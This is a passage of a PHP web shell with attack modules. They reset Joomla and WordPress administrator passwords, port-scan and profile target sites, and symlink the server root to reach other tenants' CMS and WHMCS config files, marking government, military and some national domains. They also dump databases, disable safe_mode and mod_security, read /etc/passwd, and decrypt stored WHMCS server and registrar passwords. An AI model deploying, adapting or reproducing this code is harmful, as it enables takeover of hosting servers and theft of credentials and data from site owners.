     <td>Pass :</td><td><input style="color:#FF0000;background-color:#000000" type="text" name="pass"/></td>
</tr>
<tr>
     <td>db :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="db" /></td>
</tr>
<tr>
     <td>dbprefix :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="jop" value="jos_users" /></td>
</tr>
<tr>
     <td>Admin User :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="users" value="useradmin" /></td>
</tr>
<tr>
     <td>Admin Password :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="passwd" value="passadmin" /></td>
</tr>
<tr>
      <td colspan="6" align="center" style="color:#FF0000;background-color:#000000" width="70%"> <input type="submit" value="SQL" style="color:#FF0000;background-color:#000000" maxlength="30" />  <input type="reset" value="clear" style="color:#FF0000;background-color:#000000" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div></center>';

$host   = $_POST['host'];
$user   = $_POST['user'];
$pass   = $_POST['pass'];
$db     = $_POST['db'];
$jop    = $_POST['jop'];
$users   = $_POST['users'];
$admpas = $_POST['passwd'];

function joomlahash($password) {
	$random = rand();
	$string = md5("$random");
	$yourpassword = "$password";
	$random32 = "$string";
	$join = "$password$random32";
	$md5 = md5("$join");
	$jomlaahash = "$md5:$random32";
	return $jomlaahash;
}

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$cond =@ mysql_select_db($db) or die;

$query =@mysql_query("UPDATE $jop SET username ='".$users."' WHERE usertype = Super Administrator");
$query =@mysql_query("UPDATE $jop SET password ='".joomlahash($admpas)."' WHERE usertype = Super Administrator");
$query =@mysql_query("UPDATE $jop SET username ='".$users."' WHERE usertype = deprecated");
$query =@mysql_query("UPDATE $jop SET password ='".joomlahash($admpas)."' WHERE usertype = deprecated");

}else{
  echo "<center><br /><div class='com'>Enter the database !<br /><br /></div></center>";
}
}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'wp-reset'))
{	
?><?php echo $pwd; ?><?php

@error_reporting(0);
@ini_set('error_log',NULL);
  echo '
<div class="com">
<form method="post">
<center><br><br><table border="1" bordercolor="#FFFFFF" width="400" cellpadding="1" cellspacing="1">
 <br />

<tr>
     <td>Host :</td>
     <td><input type="text" name="host" style="color:#FF0000;background-color:#000000" value="localhost" /></td>
</tr>

<tr>
     <td>user :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="user" /></td>
</tr>
<tr>
     <td>Pass :</td><td><input type="text" style="color:#FF0000;background-color:#000000" name="pass"/></td>
</tr>
<tr>
     <td>db :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="db" /></td>
</tr>
<tr>
     <td>user admin :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="useradmin" value="admin" /></td>
</tr>
<tr>
     <td>pass admin :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="passadmin" value="admin"/></td>
</tr>
<tr>
      <td colspan="6" align="center" width="70%"> <input type="submit" style="color:#FF0000;background-color:#000000" value="SQL" maxlength="30" />  <input type="reset" value="clear" style="color:#FF0000;background-color:#000000" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div></center>';

$host       = $_POST['host'];
$user       = $_POST['user'];
$pass       = $_POST['pass'];
$db         = $_POST['db'];
$useradmin  = $_POST['useradmin'];
$pass_ad    = $_POST['passadmin'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$crypt = crypt($pass_ad);
$query =@mysql_query("UPDATE `wp_users` SET `user_login` ='".$useradmin."' WHERE ID = 1") or die('Cant Update ID Number 1');
$query =@mysql_query("UPDATE `wp_users` SET `user_pass` ='".$crypt."' WHERE ID = 1") or die('Cant Update ID Number 1');
if ($query)
{
  echo "<center><br /><div class='com'>Queried !<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>Enter the database !<br /><br /></div></center>";
}
}
	
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'web-info'))
{	
?><?php echo $pwd; ?><?php
@set_time_limit(0);
@error_reporting(0);

function sws_domain_info($site)
{
$getip = @file_get_contents("http://networktools.nl/whois/$site");
flush();
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}


function sws_net_info($site)
{
$getip = @file_get_contents("http://networktools.nl/asinfo/$site");
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}

function sws_site_ser($site)
{
$getip = @file_get_contents("http://networktools.nl/reverseip/$site");
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}

function sws_sup_dom($site)
{
$getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
$ip    = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');

return $ip;
flush();
}

function sws_port_scan($ip)
{

$list_post = array('80','21','22','2082','25','53','110','443','143');

foreach ($list_post as $o_port)
{
$connect = @fsockopen($ip,$o_port,$errno,$errstr,5);

           if($connect)
           {
           echo " $ip : $o_port    &nbsp;&nbsp;&nbsp; <u style=\"color: #009900\">Open</u> <br /><br />";
           flush();
           }
}

}

function findit($mytext,$starttag,$endtag) {
 $posLeft  = @stripos($mytext,$starttag)+strlen($starttag);
 $posRight = @stripos($mytext,$endtag,$posLeft+1);
 return  @substr($mytext,$posLeft,$posRight-$posLeft);
 flush();
}

echo '<br><br><center>';


echo '
<br />
<div class="sc"><form method="post">
Site to scan : <input type="text" name="site" size="30" style="color:#FF0000;background-color:#000000" value="site.com"   /> &nbsp;&nbsp <input type="submit" style="color:#FF0000;background-color:#000000" name="scan" value="Scan !"  />
</form></div>';


if(isset($_POST['scan']))
{




$site =  @htmlentities($_POST['site']);
                 if (empty($site)){die('<br /><br /> Not add IP .. !');}

$ip_port = @gethostbyname($site);

echo "





<br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>

<div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
<div class=\"ru\"> <br /><br /><pre>
";
echo "".sws_port_scan($ip_port)." </pre></div> ";

flush();



echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
<div class=\"ru\">
<pre>".sws_domain_info($site)."</pre></div>";
flush();

echo "
<div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_net_info($site)."</pre> </div>";
flush();

echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_sup_dom($site)."</pre> </div>";
flush();


echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_site_ser($site)."</pre> </div>
<div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
flush();





}

echo '</center>';
}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'identify'))
{	
?><?php echo $pwd; ?><?php

echo "<center><br><br>
<font style=\"color:#FF0000\">This function is used to identify some CMS on all website in this server</font><br>
<font style=\"color:#FF0000\">may take very long time and this shell gonna lag, if you want to continue, press \"Check Now\" button</font><br><br>
<form type=post>
<input type='submit' style=\"color:#FF0000\" value='Check Now' name='checkingstart'>
</form></center>";

if (isset($_POST['checkingstart'])) {

echo "<center>";

$WebUrl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$Explode=explode('/',$WebUrl );
$WebUrl =str_replace($Explode[count($Explode)-1],'',$WebUrl );


@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);

$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
die (" can't read /etc/named.conf,Please use <a href='?vvip=sytc'>/etc Symlink</a>");
}
$new12 = explode (', ', $dis_func);
if (in_array('posix_getpwuid', $new12)){die('<center><b># posix_getpwuid is Not Supported</b></center>');}
else
{
echo "<div class='tmp'>
<table border='1' bordercolor='#FF0000' width='500' cellpadding='1' cellspacing='0'><td> Domains </td><td> Script </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$Wordpress=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/wp-config.php';
$wp=get_headers($Wordpress);
$haystackwp=$wp[0];
$Wordpress2=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/blog/wp-config.php';
$wp2=get_headers($Wordpress2);
$haystackwp2=$wp2[0];
$Joomla=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/configuration.php';
$jmla=get_headers($Joomla);
$haystackjmla=$jmla[0];
$Joomla2=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/joomla/configuration.php';
$jmla2=get_headers($Joomla2);
$haystackjmla2=$jmla2[0];
$Vbulletin=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/includes/config.php';
$vb=get_headers($Vbulletin);
$haystackvb=$vb[0];
$Vbulletin3=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/vb/includes/config.php';
$vb3=get_headers($Vbulletin3);
$haystackvb2=$vb3[0];
$Vbulletin5=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/forum/includes/config.php';
$vb5=get_headers($Vbulletin5);
$haystackvb5=$vb5[0];
$whmcs1=$WebUrl.'/sym/root/home/'.$UID['name'].'public_html/clients/configuration.php';
$whm=get_headers($whmcs1);
$haystackwhm=$whm[0];
$whmcs1=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/support/configuration.php';
$whm=get_headers($whmcs1);
$haystackwhm=$whm[0];
$whmcs2=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/client/configuration.php';
$whm2=get_headers($whmcs2);
$haystackwhm2=$whm2[0];
$whmcs3=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/submitticket.php';
$whm3=get_headers($whmcs3);
$haystackwhm3=$whm3[0];
$whmcs4=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/client/configuration.php';
$whm4=get_headers($whmcs4);
$haystackwhm=$whm4[0];
$Websitez = strpos($haystackwp,'200');
$Websitez='&nbsp;';
if (strpos($haystackwp,'200') == true )
{
$Websitez="<a href='".$Wordpress."' target='_blank'>Wordpress</a>";
}
elseif (strpos($haystackwp2,'200') == true)
{
$Websitez="<a href='".$Wordpress2."' target='_blank'>Wordpress</a>";
}
elseif (strpos($haystackjmla,'200')  == true and strpos($haystackwhm3,'200')  == true )
{
$Websitez=" <a href='".$whmcs3."' target='_blank'>WHMCS</a>";
}
elseif (strpos($haystackwhm,'200')  == true)
{
$Websitez =" <a href='".$whmcs1."' target='_blank'>WHMCS</a>";
}
elseif (strpos($haystackwhm2,'200')  == true)
{
$Websitez =" <a href='".$whmcs2."' target='_blank'>WHMCS</a>";
}
elseif (strpos($haystackjmla,'200')  == true)
{
$Websitez=" <a href='".$Joomla."' target='_blank'>Joomla</a>";
}
elseif (strpos($haystackjmla2,'200')  == true)
{
$Websitez=" <a href='".$Joomla2."' target='_blank'>Joomla</a>";
}
elseif (strpos($haystackvb,'200')  == true)
{
$Websitez=" <a href='".$Vbulletin."' target='_blank'>vBulletin</a>";
}
elseif (strpos($haystackvb2,'200')  == true)
{
$Websitez=" <a href='".$Vbulletin3."' target='_blank'>vBulletin</a>";
}
elseif (strpos($Vbulletin4,'200')  == true)
{
$Websitez=" <a href='".$Vbulletin5."' target='_blank'>vBulletin</a>";
}
else
{
continue;
}
$name = $UID['name'] ;
echo '<tr><td><a href=http://www.'.$string[1][0].'/>'.$string[1][0].'</a></td>
<td>'.$Websitez.'</td></tr></center>';
flush();
}
}
}
}
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'vb'))
{	
?><?php echo $pwd; ?><?php echo $pwd; ?><?php   

@set_time_limit(0);

echo "<center>";

@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='#FF0000' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir';
$israel = '\.il';
$indo   = '\.id';
$sg12   = '\.sg';
$edu    = '\.edu';
$gov    = '\.gov';
$gose   = '\.go';
$gober  = '\.gob';
$mil1   = '\.mil';
$mil2   = '\.mi';
if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   

}

elseif(isset($_GET['x']) && ($_GET['x'] == 'mysqlbackup'))
{	
?><?php echo $pwd; ?><?php

echo '<center><br><br><br>
<table border=1 width=400 style="border-collapse: collapse" cellpadding=2>
<tr>
<td width=400 colspan=2 style=\'color:#FF0000;background-color:#000000\'><p align=center>
<b><font face=Arial size=2 style=\'color:#FF0000;background-color:#000000\'>Backup Database</font></b>
</td></tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'>
<font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>DB Type:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'>
<form method=post action="'.$me.'">
<select style=\'color:#FF0000;background-color:#000000\' name=method>
<option value="gzip">Gzip</option>
<option value="sql">Sql</option>
</select></td></tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'>
<font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Server:</font>
</td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'>
<input type=text name=server style=\'color:#FF0000;background-color:#000000\' value=localhost size=35>
</td></tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'><font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Username:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'><input style=\'color:#FF0000;background-color:#000000\' type=text name=username size=35></td>
</tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'><font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Password:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'><input style=\'color:#FF0000;background-color:#000000\' type=text name=password></td>
</tr>
<tr>
<td width=150 style=\'color:#FF0000;background-color:#000000\'><font face=Arial style=\'color:#FF0000;background-color:#000000\' size=2>Data Base Name:</font></td>
<td width=250 style=\'color:#FF0000;background-color:#000000\'><input style=\'color:#FF0000;background-color:#000000\' type=text name=dbname></td>
</tr>
<tr>
<td width=400 colspan=2 style=\'color:#FF0000;background-color:#000000\'><center><input style=\'color:#FF0000;background-color:#000000\' type=submit value="  Dump!  " ></td>
</tr>
</table></form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='sql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}

function filesize_n($path)
{
        $size = @filesize($path);
        if( $size < 0 ){
            ob_start();
            system('ls -al "'.$path.'" | awk \'BEGIN {FS=" "}{print $5}\'');
            $size = ob_get_clean();
        }

        return $size;
}
function format_size($size) {
      $sizes = array(" Bytes", " KB", " MB", " GB", " TB", " PB", " EB", " ZB", " YB");
      if ($size == 0) { return('n/a'); } else {
      return (round($size/pow(1024, ($i = floor(log($size, 1024)))), $i > 1 ? 2 : 0) . $sizes[$i]); }
}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='sql'){
fclose ($fp);
}else{
gzclose($fp);}
$sizedatabasefile = filesize_n($file);
$sizehumanreadable = format_size($sizedatabasefile);
echo "<br><br>
<center><font color='#FF0000'>Download Database -&#62; </font>
<a href='$file'>Here</a>
<font color='#FF0000'> | DatabaseFileSize -&#62; $sizehumanreadable </font></center>";
flush();
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'security-mode'))
{	
?><?php echo $pwd; ?><?php

echo "<html>
<center><br><br><br>
<font color=#FF0000 > Disable SafeMode and Clear Disable Function using php.ini </font><br>
<form method='POST' >
<font color=#FF0000 > Path to Disable : </font><input type='text' name='phpinisafemode' value='$pwd' style='color:#FF0000;background-color:#000000' /><br> 
<input type='submit' name='dsmsubmit' style='color:#FF0000;background-color:#000000' value='Create PHP.INI' />
</form>
<br><br>
<font color=#FF0000 > Disable SafeMode and Clear Disable Function using Htaccess </font><br>
<form method='POST' >
<font color=#FF0000 > Path to Disable : </font><input type='text' name='htaccesssafemode' style='color:#FF0000;background-color:#000000' value='$pwd' /><br>
<input type='submit' name='omssubmit' style='color:#FF0000;background-color:#000000' value='Create .HTACCESS' />
</form>";

$dirphpini = $_POST['phpinisafemode'];
$dirhtaccess = $_POST['htaccesssafemode'];
$phpininamelol = "php.ini";

if($_POST['omssubmit'])
{
 $fse=fopen("$dirphpini.htaccess","w");
 fwrite($fse,'<IfModule mod_security.c>
    Sec------Engine Off
    Sec------ScanPOST Off
</IfModule>');
 fclose($fse);
}

else if ($_POST['dsmsubmit'])
{
 $fse=fopen("$dirhtaccess$phpininamelol","w");
 fwrite($fse,'safe_mode=OFF
disable_functions=NONE');
 fclose($fse);
}
}   

elseif(isset($_GET['x']) && ($_GET['x'] == 'process'))
{	
?><?php echo $pwd; ?><?php

function processc99() {
 if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");} 
 else {$handler = "tasklist";} 
 $ret = myshellexec($handler); 
 if (!$ret) {echo "Can't execute \"".$handler."\"!";} 
 else 
 { 
  if (empty($processes_sort)) {$processes_sort = $sort_default;} 
  $parsesort = parsesort($processes_sort); 
  if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;} 
  $k = $parsesort[0]; 
  $ret = htmlspecialchars($ret); 
  if (!$win) 
  { 
   if ($pid) 
   { 
    if (is_null($sig)) {$sig = 9;} 
    echo "Sending signal ".$sig." to #".$pid."... "; 
    if (posix_kill($pid,$sig)) {echo "OK.";} 
    else {echo "ERROR.";} 
   } 
   while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);} 
   $stack = explode("\n",$ret); 
   $head = explode(" ",$stack[0]); 
   unset($stack[0]);  
   $prcs = array(); 
   foreach ($stack as $line) 
   { 
    if (!empty($line)) 
{ 
 echo "<tr>"; 
     $line = explode(" ",$line); 
     $line[10] = join(" ",array_slice($line,10)); 
     $line = array_slice($line,0,11); 
     $prcs[] = $line; 
     echo "</tr>"; 
    } 
   } 
  } 
  else 
  { 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("  ",$ret)) {$ret = str_replace("  ","",$ret);} 
   while (ereg("",$ret)) {$ret = str_replace("","",$ret);} 
   while (ereg(" ",$ret)) {$ret = str_replace(" ","",$ret);} 
   $ret = convert_cyr_string($ret,"d","w"); 
   $stack = explode("\n",$ret); 
   unset($stack[0],$stack[2]); 
   $stack = array_values($stack); 
   $head = explode("",$stack[0]); 
   $head[1] = explode(" ",$head[1]); 
   $head[1] = $head[1][0]; 
   $stack = array_slice($stack,1); 
   unset($head[2]); 
   $head = array_values($head); 
   if ($k > count($head)) {$k = count($head)-1;} 
   $prcs = array(); 
   foreach ($stack as $line) 
   { 
    if (!empty($line)) 
    { 
     echo "<tr>"; 
     $line = explode("",$line); 
     $line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]); 
     $line[2] = intval(str_replace(" ","",$line[2]))*1024;  
     $prcs[] = $line; 
     echo "</tr>"; 
    } 
   } 
  } 
  $head[$k] = "<b>".$head[$k]."</b>".$y; 
  $v = $processes_sort[0]; 
  if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);} 
  $tab = array(); 
  $tab[] = $head; 
  $tab = array_merge($tab,$prcs); 
  echo "<TABLE height=1 cellSpacing=0 cellPadding=5 width=\"100%\" border=1>"; 
  foreach($tab as $i=>$k) 
  { 
   echo "<tr>"; 
   foreach($k as $j=>$v) {
   if ($win and $i > 0 and $j == 2) {
   $v = view_size($v);
   } 
   
   echo "<td>".$v."</td>";} 
   echo "</tr>"; 
  } 
  echo "</table>"; 
 }
}

echo "<center><br><br>";
	if($win) {
	echo "<form method='post'>
	<select style='color:#FF0000;background-color:#000000' name='windowsprocess'>
	<option name='systeminfo'>System Info</option>
	<option name='active'>Active Connections</option>
	<option name='runningserv'>Running Services</option>
	<option name='useracc'>User Accounts</option>
	<option name='showcom'>Show Computers</option>
	<option name='arptab'>ARP Table</option>
	<option name='ipconf'>IP Configuration</option>
	</select>
	<input type='submit' style='color:#FF0000;background-color:#000000' name='submitwinprocess' value='View'>
	</form>
	";
	} else {
	echo "<form method='post'>
	<select style='color:#FF0000;background-color:#000000' name='nonwindowsprocess'>
	<option name='processsta'>Process status</option>
	<option name='syslog'>Syslog</option>
	<option name='resolv'>Resolv</option>
	<option name='hosts'>Hosts</option>
	<option name='passwd'>Passwd</option>
	<option name='cpuinfo'>Cpuinfo</option>
	<option name='version'>Version</option>
	<option name='sbin'>Sbin</option>
	<option name='interrupts'>Interrupts</option>
	<option name='lsattr'>lsattr</option>
	<option name='uptime'>Uptime</option>
	<option name='fstab'>Fstab</option>
	<option name='hddspace'>HDD Space</option>
	</select>
	<input type='submit' style='color:#FF0000;background-color:#000000' name='submitnonwinprocess' value='View'>
	</form>
	";
	}
	
	$windowsprocess = $_POST['windowsprocess'];
	$nonwindowsprocess = $_POST['nonwindowsprocess'];
	
	if ($windowsprocess=="System Info") $winruncom = "systeminfo";
	if ($windowsprocess=="Active Connections") $winruncom = "netstat -an";
	if ($windowsprocess=="Running Services") $winruncom = "net start";
	if ($windowsprocess=="User Accounts") $winruncom = "net user";
	if ($windowsprocess=="Show Computers") $winruncom = "net view";
	if ($windowsprocess=="ARP Table") $winruncom = "arp -a";
	if ($windowsprocess=="IP Configuration") $winruncom = "ipconfig /all";
	if ($nonwindowsprocess=="Process status") $systeminfo = "ps aux";
	if ($nonwindowsprocess=="Syslog") $winruncom = "cat  /etc/syslog.conf";
	if ($nonwindowsprocess=="Resolv") $winruncom = "cat  /etc/resolv.conf";
	if ($nonwindowsprocess=="Hosts") $winruncom = "cat /etc/hosts";
	if ($nonwindowsprocess=="Passwd") $winruncom = "cat /etc/passwd";
	if ($nonwindowsprocess=="Cpuinfo") $winruncom = "cat /proc/cpuinfo";
	if ($nonwindowsprocess=="Version") $winruncom = "cat /proc/version";
	if ($nonwindowsprocess=="Sbin") $winruncom = "ls -al /usr/sbin";
	if ($nonwindowsprocess=="Interrupts") $winruncom = "cat /proc/interrupts";
	if ($nonwindowsprocess=="lsattr") $winruncom = "lsattr -va";
	if ($nonwindowsprocess=="Uptime") $winruncom = "uptime";
	if ($nonwindowsprocess=="Fstab") $winruncom = "cat /etc/fstab";
	if ($nonwindowsprocess=="HDD Space") $winruncom = "df -h";
	

	if (isset($winruncom)) {
	echo "<table class='cmdbox'> 
	<tbody><tr>
	<td colspan='2'> 
	<textarea class='output' name='content'>".exe($winruncom)."</textarea> 
	</td></tr></table></center>";
	}
	
	if (isset($systeminfo)) {
		echo "<br><br>";
		processc99();
	}

}

elseif(isset($_GET['x']) && ($_GET['x'] == 'whmcs'))
{	
?><?php echo $pwd; ?><?php

function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "<hr>
<br>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table border=1>
<tr><td>db_host </td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FF0000;background-color:#000000' size='30' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FF0000;background-color:#000000' type='text' size='30' name='cc_encryption_hash' value=''></td></tr>
</table>
<br>
<INPUT class=submit type='submit' style='color:#FF0000;background-color:#000000' value='Submit' name='Submit'>
</FORM>
</center>
<hr>";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}
